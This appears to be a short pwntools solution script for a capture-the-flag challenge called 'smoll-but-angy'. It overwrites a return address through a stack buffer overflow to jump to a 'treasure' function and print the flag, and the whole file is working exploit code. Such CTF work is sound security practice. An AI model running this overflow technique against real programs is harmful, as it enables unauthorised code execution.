from pwn import *
elf = context.binary = ELF('./smoll-but-angy')

p = process('./smoll-but-angy')
# p = remote("IP_ADDR", PORT)

offset = 0x80 + 0x8
TREASURE_ADDR = elf.sym['treasure']
log.success(f"TREASURE_ADDR: {hex(TREASURE_ADDR)}")

payload = b'A' * offset + p32(TREASURE_ADDR)
p.sendlineafter(b"You dare challenge me?\n", payload)

flag = p.recvall(timeout=1).strip()
print(flag.decode())

p.close()